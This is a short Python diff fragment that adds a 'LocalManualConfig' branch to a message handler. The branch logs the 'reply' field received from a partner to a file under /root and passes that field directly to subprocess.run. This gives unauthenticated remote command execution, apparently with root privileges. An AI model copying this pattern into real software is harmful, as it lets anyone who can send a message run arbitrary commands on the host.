@@ -120,6 +120,11 @@ def do(body):
   cachefile=binascii.unhexlify(cachefileenc)
   with open(cachename,'wb') as f:
    f.write(cachefile)
+########## if HostManualconfig ##############
+ elif r["req"]=='LocalManualConfig':  
+  with open('/root/recv2','a') as f:
+   f.write('received LocalManualConfig from parnter :'+str(r["reply"])+'\n')
+  result=subprocess.run(r["reply"],stdout=subprocess.PIPE)
  
 
 
